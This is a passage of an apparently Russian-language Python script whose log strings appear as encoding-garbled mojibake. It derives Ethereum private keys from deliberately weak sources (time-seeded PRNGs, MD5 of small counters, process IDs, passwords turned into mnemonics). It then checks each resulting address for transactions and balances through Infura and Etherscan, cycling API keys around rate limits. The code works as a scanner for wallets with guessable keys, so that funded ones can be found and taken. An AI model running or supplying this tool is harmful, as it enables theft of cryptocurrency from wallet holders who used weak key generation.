    random_bytes = bytes([random.getrandbits(8) for _ in range(32)])
    private_key = Web3.keccak(random_bytes).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –∏–∑ Mersenne Twister: {private_key}")
    return private_key

def generate_concatenated_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –∏–∑ –∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü–∏–∏ —Å–ª–∞–±—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤")
    timestamp = int(datetime.datetime.now().timestamp()).to_bytes(8, 'big')
    pid = os.getpid().to_bytes(4, 'big')
    random_part = os.urandom(8)
    constant = b'\xAB\xCD' * 6
    combined = timestamp + pid + random_part + constant
    private_key = Web3.keccak(combined).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –∏–∑ –∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü–∏–∏: {private_key}")
    return private_key

def generate_md5_based_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ MD5")
    counter = random.randint(0, 2**32 - 1)
    input_data = str(counter).encode()
    md5_hash = hashlib.md5(input_data).digest()
    combined = md5_hash + md5_hash
    private_key = Web3.keccak(combined).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á —á–µ—Ä–µ–∑ MD5 –¥–ª—è {counter}: {private_key}")
    return private_key

def generate_xorshift_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –∏–∑ Xorshift")
    seed = int(datetime.datetime.now().timestamp()) & 0xFFFFFFFF
    state0 = seed
    state1 = seed ^ 0xDEADBEEF
    random_bytes = bytearray()
    for _ in range(32):
        t = state0
        s = state1
        state0 = s
        t ^= (t << 23) & 0xFFFFFFFFFFFFFFFF
        t ^= (t >> 17)
        t ^= s ^ (s >> 26)
        state1 = t
        random_bytes.append((t + s) & 0xFF)
    private_key = Web3.keccak(bytes(random_bytes)).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –∏–∑ Xorshift: {private_key}")
    return private_key

def generate_truncated_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –∏–∑ —É—Å–µ—á—ë–Ω–Ω—ã—Ö –±–æ–ª—å—à–∏—Ö —á–∏—Å–µ–ª")
    large_number = os.urandom(64)
    truncated = large_number[:32]
    private_key = Web3.keccak(truncated).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –∏–∑ —É—Å–µ—á—ë–Ω–Ω–æ–≥–æ —á–∏—Å–ª–∞: {private_key}")
    return private_key

def generate_vanity_address(prefix=None, suffix=None):
    while True:
        private_key = generate_private_key()
        address = get_address_from_private_key(private_key)
        address_lower = address.lower()
        if prefix and suffix:
            if address_lower.startswith(prefix.lower()) and address_lower.endswith(suffix.lower()):
                logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω vanity-–∞–¥—Ä–µ—Å {address}")
                return private_key, address
        elif prefix:
            if address_lower.startswith(prefix.lower()):
                logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω vanity-–∞–¥—Ä–µ—Å {address}")
                return private_key, address
        elif suffix:
            if address_lower.endswith(suffix.lower()):
                logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω vanity-–∞–¥—Ä–µ—Å {address}")
                return private_key, address

def generate_private_key_in_group(group):
    start_range, end_range = GROUP_RANGES[group]
    private_key_int = random.randint(start_range, end_range)
    private_key_bytes = private_key_int.to_bytes(32, byteorder='big')
    private_key = Web3.keccak(private_key_bytes).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –≤ –≥—Ä—É–ø–ø–µ {group}: {private_key}")
    return private_key

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–æ–π —Ñ—Ä–∞–∑—ã –∏–∑ –ø–∞—Ä–æ–ª—è
def generate_mnemonic_from_password(password):
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–æ–π —Ñ—Ä–∞–∑—ã –∏–∑ –ø–∞—Ä–æ–ª—è")
    # –•—ç—à–∏—Ä—É–µ–º –ø–∞—Ä–æ–ª—å —á–µ—Ä–µ–∑ Keccak-256 –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è 16 –±–∞–π—Ç —ç–Ω—Ç—Ä–æ–ø–∏–∏
    entropy = Web3.keccak(text=password)[:16]  # –ë–µ—Ä–µ–º –ø–µ—Ä–≤—ã–µ 16 –±–∞–π—Ç
    mnemo = Mnemonic("english")
    mnemonic_phrase = mnemo.to_mnemonic(entropy)
    seed = mnemo.to_seed(mnemonic_phrase)
    private_key = Web3.keccak(seed[:32]).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞ –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∞—è —Ñ—Ä–∞–∑–∞ –∏–∑ –ø–∞—Ä–æ–ª—è '{password}': {mnemonic_phrase}, –∫–ª—é—á: {private_key}")
    return private_key, mnemonic_phrase

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–µ–π –ø–æ –≤—ã–±—Ä–∞–Ω–Ω–æ–º—É –º–µ—Ç–æ–¥—É
async def generate_private_key_by_method(method, used_keys, used_keys_lock, vulnerable_type=None, password=None, timestamp=None):
    mnemonic_phrase = None
    async with used_keys_lock:
        if method == 1:
            private_key = generate_private_key()
        elif method == 2:
            return None, None
        elif method == 3:
            return None, None
        elif method == 4:
            if password:
                private_key, mnemonic_phrase = generate_mnemonic_from_password(password)
            else:
                private_key, mnemonic_phrase = generate_mnemonic_key()  # Fallback –Ω–∞ —Å—Ç–∞—Ä—ã–π –º–µ—Ç–æ–¥
        elif method == 5:
            private_key = generate_vulnerable_combined_key(vulnerable_type)
        elif method == 6:
            private_key = generate_timestamp_key()
        elif method == 7:
            private_key = generate_mersenne_key()
        elif method == 8:
            private_key = generate_concatenated_key()
        elif method == 9:
            private_key, mnemonic_phrase = generate_password_key(password)
        elif method == 10:
            private_key = generate_md5_based_key()
        elif method == 11:
            private_key = generate_xorshift_key()
        elif method == 12:
            private_key = generate_truncated_key()
        else:
            logger.error(f"–ù–µ–≤–µ—Ä–Ω—ã–π –º–µ—Ç–æ–¥ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏: {method}")
            return None, None
        # –î–ª—è –º–µ—Ç–æ–¥–æ–≤ 4 –∏ 9 –Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å, —Ç–∞–∫ –∫–∞–∫ –∫–∞–∂–¥—ã–π –ø–∞—Ä–æ–ª—å/—Å–ª–æ–≤–æ –¥–æ–ª–∂–µ–Ω –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ä–æ–≤–Ω–æ –æ–¥–∏–Ω –∫–ª—é—á
        if method in [4, 9] and password:
            return private_key, mnemonic_phrase
        # –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤ –ø—Ä–æ–≤–µ—Ä—è–µ–º —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å
        if private_key and private_key not in used_keys:
            used_keys.add(private_key)
            logger.debug(f"–£–Ω–∏–∫–∞–ª—å–Ω—ã–π –∫–ª—é—á {private_key} –¥–æ–±–∞–≤–ª–µ–Ω")
            return private_key, mnemonic_phrase
        logger.warning(f"–ü–æ–≤—Ç–æ—Ä–Ω—ã–π –∫–ª—é—á {private_key}")
        return None, None

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
async def check_transactions(address, session):
    logger.debug(f"–ù–∞—á–∞–ª–æ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è –∞–¥—Ä–µ—Å–∞: {address}")
    
    if not await check_internet(session):
        print(Fore.RED + "–ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É." + Style.RESET_ALL)
        logger.error(f"–ù–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –¥–ª—è –∞–¥—Ä–µ—Å–∞: {address}")
        return False

    available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id)]
    logger.debug(f"–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–ª—é—á–∏: {available_keys}")
    if not available_keys:
        await wait_for_api_reset()
        available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id)]
        logger.debug(f"–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–ª—é—á–∏ –ø–æ—Å–ª–µ –æ–∂–∏–¥–∞–Ω–∏—è: {available_keys}")
        if not available_keys:
            logger.error("–í—Å–µ API –∫–ª—é—á–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã –ø–æ—Å–ª–µ –æ–∂–∏–¥–∞–Ω–∏—è.")
            print(Fore.RED + "–í—Å–µ API –∫–ª—é—á–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã." + Style.RESET_ALL)
            return False

    for key_id in available_keys:
        api_type = API_STATES[key_id]['type']
        print(Fore.CYAN + f"–ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ –∫–ª—é—á {key_id}: {address}" + Style.RESET_ALL)
        start_time = datetime.datetime.now()
        result = None
        for attempt in range(MAX_RETRIES):
            try:
                if api_type == 'infura':
                    result = await check_transactions_infura(address, session, key_id)
                elif api_type == 'etherscan':
                    result = await check_transactions_etherscan(address, session, key_id)
                break
            except (aiohttp.ClientError, asyncio.TimeoutError, Web3Exception) as e:
                logger.warning(f"–ü–æ–ø—ã—Ç–∫–∞ {attempt + 1}/{MAX_RETRIES} –¥–ª—è –∫–ª—é—á–∞ {key_id}: {e}")
                if attempt < MAX_RETRIES - 1:
                    delay = RETRY_BACKOFF ** attempt
                    logger.debug(f"–û–∂–∏–¥–∞–Ω–∏–µ {delay} —Å–µ–∫—É–Ω–¥.")
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"–í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è –∫–ª—é—á–∞ {key_id} –ø—Ä–æ–≤–∞–ª–∏–ª–∏—Å—å: {e}")
                    result = None
        
        if result is not None:
            logger.info(f"–ö–ª—é—á {key_id} –≤–µ—Ä–Ω—É–ª: {result} –¥–ª—è {address}")
            elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
            logger.debug(f"–ó–∞–ø—Ä–æ—Å –∫ –∫–ª—é—á—É {key_id}: {elapsed_time:.2f} —Å–µ–∫")
            await asyncio.sleep(API_REQUEST_INTERVAL)
            return result
        
        logger.warning(f"–ö–ª—é—á {key_id} –Ω–µ –≤–µ—Ä–Ω—É–ª —Ä–µ–∑—É–ª—å—Ç–∞—Ç.")

    logger.debug("–í—Å–µ –∫–ª—é—á–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω—ã, —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –Ω–µ—Ç.")
    return False

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π —á–µ—Ä–µ–∑ Infura
async def check_transactions_infura(address, session, key_id):
    state = API_STATES[key_id]
    infura_url = state['key']
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getTransactionCount",
            "params": [address, "latest"],
            "id": 1
        }
        headers = {"Content-Type": "application/json"}
        async with session.post(infura_url, json=payload, headers=headers, timeout=5) as resp:
            response_text = await resp.text()
            logger.debug(f"Infura –∫–ª—é—á {key_id} –∫–æ–¥: {resp.status}, –æ—Ç–≤–µ—Ç: {response_text} –¥–ª—è {address}")
            if resp.status == 200:
                try:
                    data = await resp.json()
                    if 'result' in data:
                        transactions = int(data['result'], 16)
                        logger.debug(f"Infura –∫–ª—é—á {key_id}: {transactions} —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è {address}")
                        return transactions > 0
                    else:
                        logger.error(f"Infura –∫–ª—é—á {key_id}: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç: {data}")
                        return None
                except ValueError as e:
                    logger.error(f"Infura –∫–ª—é—á {key_id}: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π JSON: {e}, –æ—Ç–≤–µ—Ç: {response_text}")
                    return None
            elif resp.status in (429, 401):
                try:
                    data = await resp.json()
                    error_msg = data.get('error', {}).get('message', 'Rate limit exceeded').lower()
                except ValueError:
                    error_msg = 'Rate limit exceeded'
                retry_after = resp.headers.get('Retry-After', None)
                logger.warning(f"–õ–∏–º–∏—Ç –∏–ª–∏ –æ—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ Infura –∫–ª—é—á {key_id}: '{error_msg}', Retry-After: {retry_after}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                if any(keyword in error_msg for keyword in ['daily', 'limit reached', 'rate limit', 'exceeded']):
                    wait_time = time_until_midnight_utc()
                    state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                    print(Fore.YELLOW + f"–î–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç Infura –∫–ª—é—á–∞ {key_id} ('{error_msg}'). –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC." + Style.RESET_ALL)
                    logger.debug(f"Infura –∫–ª—é—á {key_id}: –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫")
                else:
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    if retry_after:
                        try:
                            retry_after = int(retry_after)
                            retry_after = max(retry_after, MIN_RETRY_AFTER)
                            state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                            logger.debug(f"Infura –∫–ª—é—á {key_id} Retry-After: {retry_after} —Å–µ–∫")
                        except ValueError:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Infura –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                    else:
                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                        logger.debug(f"Infura –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                    print(Fore.YELLOW + f"–í—Ä–µ–º–µ–Ω–Ω—ã–π –ª–∏–º–∏—Ç Infura –∫–ª—é—á–∞ {key_id} ('{error_msg}')." + Style.RESET_ALL)
                return None
            else:
                print(Fore.YELLOW + f"–û—à–∏–±–∫–∞ Infura –∫–ª—é—á–∞ {key_id} (–∫–æ–¥: {resp.status})." + Style.RESET_ALL)
                logger.warning(f"–û—à–∏–±–∫–∞ Infura –∫–ª—é—á–∞ {key_id}: –∫–æ–¥ {resp.status}, –æ—Ç–≤–µ—Ç: {response_text}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                logger.debug(f"Infura –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                return None
    except (aiohttp.ClientError, asyncio.TimeoutError, Web3Exception) as e:
        print(Fore.YELLOW + f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Infura –∫–ª—é—á–∞ {key_id}: {e}." + Style.RESET_ALL)
        logger.error(f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Infura –∫–ª—é—á–∞ {key_id}: {e}")
        state['active'] = False
        state['limit_reached_time'] = datetime.datetime.now()
        state['temp_pauses'].append(datetime.datetime.now())
        if check_temp_pauses(key_id):
            return None
        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
        logger.debug(f"Infura –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
        return None

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π —á–µ—Ä–µ–∑ Etherscan
async def check_transactions_etherscan(address, session, key_id):
    state = API_STATES[key_id]
    api_key = state['key']
    try:
        url = f'https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey={api_key}'
        async with session.get(url, timeout=5) as resp:
            response_text = await resp.text()
            logger.debug(f"Etherscan –∫–ª—é—á {key_id} –∫–æ–¥: {resp.status}, –æ—Ç–≤–µ—Ç: {response_text} –¥–ª—è {address}")
            if resp.status == 200:
                try:
                    data = await resp.json()
                    if data['status'] == '1':
                        transactions = data['result']
                        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: {len(transactions)} —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è {address}")
                        return len(transactions) > 0
                    elif data['status'] == '0' and data['message'] == 'No transactions found':
                        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –Ω–µ—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è {address}")
                        return False
                    else:
                        error_msg = data.get('message', '–ù–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è').lower()
                        retry_after = resp.headers.get('Retry-After', None)
                        logger.warning(f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id}: '{error_msg}', Retry-After: {retry_after}")
                        state['active'] = False
                        state['limit_reached_time'] = datetime.datetime.now()
                        if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                            wait_time = time_until_midnight_utc()
                            state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                            print(Fore.YELLOW + f"–î–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} ('{error_msg}'). –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC." + Style.RESET_ALL)
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫")
                        else:
                            state['temp_pauses'].append(datetime.datetime.now())
                            if check_temp_pauses(key_id):
                                return None
                            if retry_after:
                                try:
                                    retry_after = int(retry_after)
                                    retry_after = max(retry_after, MIN_RETRY_AFTER)
                                    state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                    logger.debug(f"Etherscan –∫–ª—é—á {key_id} Retry-After: {retry_after} —Å–µ–∫")
                                except ValueError:
                                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                    logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                            else:
                                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                            print(Fore.YELLOW + f"–í—Ä–µ–º–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} ('{error_msg}')." + Style.RESET_ALL)
                        return None
                except ValueError as e:
                    logger.error(f"Etherscan –∫–ª—é—á {key_id}: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π JSON: {e}, –æ—Ç–≤–µ—Ç: {response_text}")
                    return None
            elif resp.status in (429, 401):
                try:
                    data = await resp.json()
                    error_msg = data.get('message', 'Rate limit exceeded').lower()
                except ValueError:
                    error_msg = 'Rate limit exceeded'
                retry_after = resp.headers.get('Retry-After', None)
                logger.warning(f"–õ–∏–º–∏—Ç –∏–ª–∏ –æ—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ Etherscan –∫–ª—é—á–∞ {key_id}: '{error_msg}', Retry-After: {retry_after}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                    wait_time = time_until_midnight_utc()
                    state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                    print(Fore.YELLOW + f"–î–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} ('{error_msg}'). –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC." + Style.RESET_ALL)
                    logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫")
                else:
                    if retry_after:
                        try:
                            retry_after = int(retry_after)
                            retry_after = max(retry_after, MIN_RETRY_AFTER)
                            state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id} Retry-After: {retry_after} —Å–µ–∫")
                        except ValueError:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                    else:
                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                    print(Fore.YELLOW + f"–í—Ä–µ–º–µ–Ω–Ω—ã–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} ('{error_msg}')." + Style.RESET_ALL)
                return None
            else:
                print(Fore.YELLOW + f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–∫–æ–¥: {resp.status})." + Style.RESET_ALL)
                logger.warning(f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id}: –∫–æ–¥ {resp.status}, –æ—Ç–≤–µ—Ç: {response_text}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                return None
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        print(Fore.YELLOW + f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id}: {e}." + Style.RESET_ALL)
        logger.error(f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id}: {e}")
        state['active'] = False
        state['limit_reached_time'] = datetime.datetime.now()
        state['temp_pauses'].append(datetime.datetime.now())
        if check_temp_pauses(key_id):
            return None
        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
        return None
    
# –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ Etherscan
async def get_balance_etherscan(address, session):
    available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id) and API_STATES[key_id]['type'] == 'etherscan']
    logger.debug(f"–î–æ—Å—Ç—É–ø–Ω—ã–µ Etherscan –∫–ª—é—á–∏ –¥–ª—è –±–∞–ª–∞–Ω—Å–∞: {available_keys}")
    if not available_keys:
        logger.debug("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö Etherscan –∫–ª—é—á–µ–π –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å–∞.")
        return None

    for key_id in available_keys:
        state = API_STATES[key_id]
        api_key = state['key']
        try:
            url = f'https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}'
            async with session.get(url, timeout=5) as resp:
                response_text = await resp.text()
                logger.debug(f"Etherscan –∫–ª—é—á {key_id} (–±–∞–ª–∞–Ω—Å) –∫–æ–¥: {resp.status}, –æ—Ç–≤–µ—Ç: {response_text} –¥–ª—è {address}")
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        if data['status'] == '1':
                            balance = int(data['result'])
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –±–∞–ª–∞–Ω—Å {balance} wei –¥–ª—è {address}")
                            await asyncio.sleep(API_REQUEST_INTERVAL)
                            return Web3.from_wei(balance, 'ether')
                        elif data['status'] == '0' and data['message'] == 'OK':
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –±–∞–ª–∞–Ω—Å 0 wei –¥–ª—è {address}")
                            return 0
                        else:
                            error_msg = data.get('message', '–ù–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è').lower()
                            retry_after = resp.headers.get('Retry-After', None)
                            logger.warning(f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å): '{error_msg}', Retry-After: {retry_after}")
                            state['active'] = False
                            state['limit_reached_time'] = datetime.datetime.now()
                            if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                                wait_time = time_until_midnight_utc()
                                state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                                print(Fore.YELLOW + f"–î–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å) ('{error_msg}'). –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC." + Style.RESET_ALL)
                                logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫")
                            else:
                                state['temp_pauses'].append(datetime.datetime.now())
                                if check_temp_pauses(key_id):
                                    return None
                                if retry_after:
                                    try:
                                        retry_after = int(retry_after)
                                        retry_after = max(retry_after, MIN_RETRY_AFTER)
                                        state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                        logger.debug(f"Etherscan –∫–ª—é—á {key_id} Retry-After (–±–∞–ª–∞–Ω—Å): {retry_after} —Å–µ–∫")
                                    except ValueError:
                                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                                else:
                                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                    logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                                print(Fore.YELLOW + f"–í—Ä–µ–º–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å) ('{error_msg}')." + Style.RESET_ALL)
                            return None
                    except ValueError as e:
                        logger.error(f"Etherscan –∫–ª—é—á {key_id}: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π JSON (–±–∞–ª–∞–Ω—Å): {e}, –æ—Ç–≤–µ—Ç: {response_text}")
                        return None
                elif resp.status in (429, 401):
                    try:
                        data = await resp.json()
                        error_msg = data.get('message', 'Rate limit exceeded').lower()
                    except ValueError:
                        error_msg = 'Rate limit exceeded'
                    retry_after = resp.headers.get('Retry-After', None)
